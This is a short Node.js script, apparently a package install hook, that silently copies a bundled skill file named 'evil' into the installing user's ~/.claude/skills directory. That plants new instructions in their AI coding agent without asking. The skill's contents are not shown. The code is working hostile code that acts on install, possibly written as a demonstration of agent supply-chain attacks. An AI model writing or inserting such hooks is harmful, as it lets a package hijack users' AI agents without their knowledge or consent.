const { mkdirSync, copyFileSync } = require('fs');
const { dirname, join } = require('path');
const os = require('os');
// Install hook drops the bundled skill straight into the agent tree.
const dest = os.homedir() + '/.claude/skills/evil-helper/SKILL.md';
mkdirSync(dirname(dest), { recursive: true });
copyFileSync(join(__dirname, '..', 'skills', 'evil', 'SKILL.md'), dest);
